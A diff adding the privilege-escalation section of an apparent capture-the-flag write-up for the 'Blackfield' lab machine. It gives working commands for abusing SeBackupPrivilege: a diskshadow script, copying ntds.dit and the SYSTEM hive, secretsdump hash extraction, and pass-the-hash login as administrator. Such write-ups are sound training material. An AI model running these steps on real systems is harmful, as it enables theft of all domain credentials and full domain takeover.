@@ -552,4 +552,158 @@ smb: \>
 
 * nice!, let's got to the root now.
 
+# []()Privilege Escalation
+
+* let's check our privileges first.
+
+> **whoami /priv**
+
+```ruby
+
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+```
+
+> **SeBackupPrivilege             Back up files and directories  Enabled**
+
+* we can backup the data since svc_backup had this privileges.
+
+> as we no this is AD machine so we will backup the NTDS.dit file and the registry file system.
+
+_The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain.
+
+* afte some google search i go accross this pdf file [show me your privileges and I will lead you to SYSTEM](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf)
+
+> first we need to use diskshadow to first make a new volume and alias it with the volume C: so i can read everything from the volume c.
+
+* read this to understand diskshadow commands. [Diskshadow docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)- [Diskshadow examples](https://docs.datacore.com/WIK-WebHelp/VSS/DiskShadow_Commands_Example.htm)
+
+* here is my txt file
+
+```ruby
+
+set context persistent nowriters#
+add volume c: alias new1#
+create#
+expose %new1% z:#
+
+```
+* let's upload it now.
+
+```ruby
+
+*Evil-WinRM* PS C:\temp> upload disk-shadow-devo.txt
+Info: Uploading disk-shadow-devo.txt to C:\temp\disk-shadow-devo.txt
+
+                                                             
+Data: 112 bytes of 112 bytes copied
+
+Info: Upload successful!
+
+```
+* now let's run it
+
+> **diskshadow /s disk-shadow-devo.txt**
+
+```ruby
+
+*Evil-WinRM* PS C:\temp> diskshadow /s disk-shadow-devo.txt
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC01,  10/2/2020 9:33:54 PM
+
+-> set context persistent nowriters
+-> add volume c: alias new1
+-> create
+Alias new1 for shadow ID {58e9f038-6f01-4038-82ec-9e0f0273f75c} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {09957e39-a36b-486e-a848-3b8383dba9ba} set as environment variable.
+
+Querying all shadow copies with the shadow copy set ID {09957e39-a36b-486e-a848-3b8383dba9ba}
+
+	* Shadow copy ID = {58e9f038-6f01-4038-82ec-9e0f0273f75c}		%new1%
+		- Shadow copy set: {09957e39-a36b-486e-a848-3b8383dba9ba}	%VSS_SHADOW_SET%
+		- Original count of shadow copies = 1
+		- Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
+		- Creation time: 10/2/2020 9:33:54 PM
+		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+		- Originating machine: DC01.BLACKFIELD.local
+		- Service machine: DC01.BLACKFIELD.local
+		- Not exposed
+		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+		- Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-> expose %new1% z:
+-> %new1% = {58e9f038-6f01-4038-82ec-9e0f0273f75c}
+The shadow copy was successfully exposed as z:\.
+->
+
+```
+
+* nice, it's time to backup files now.
+
+* first download these files and upload them to the machine [files](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
+
+> **let's upload the files.**
+
+![](https://i.ibb.co/whZMG94/uploaded.png)
+
+> **import them now.**
+
+```ruby
+
+*Evil-WinRM* PS C:\temp> Import-Module .\SeBackupPrivilegeCmdLets.dll
+*Evil-WinRM* PS C:\temp> Import-Module .\SeBackupPrivilegeUtils.dll
+
+```
+
+* let's get ntds file now
+
+> **Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit**
+
+![](https://i.ibb.co/JtS8PdR/copyntds.png)
+
+* now we need to get the **SYSTEM** hive file.
+
+> **reg save HKLM\SYSTEM c:\temp\system**
+
+![](https://i.ibb.co/2YVP2qP/systemdone.png)
+
+> **download system system.hive**
+
+> **download ntds.dit**
+
+* let's use secretdump from impacket to dump NTLM hash
+
+> **python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system.hive -hashes lmhash:nthash LOCAL -output LOCAL-HASHS**
+
+![](https://i.ibb.co/BNLQLyq/adminhash.png)
+
+* pingo!, we got the NTLM hash for administrator, let's try to login with it now.
+
+> **evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee**
+
+![](https://i.ibb.co/vkxX0Gp/rootflag.png)
+
+* Thanks for reading.
+
+* cheers!
+
+ <script src="https://www.hackthebox.eu/badge/103789"></script>
+
+
+
+
 
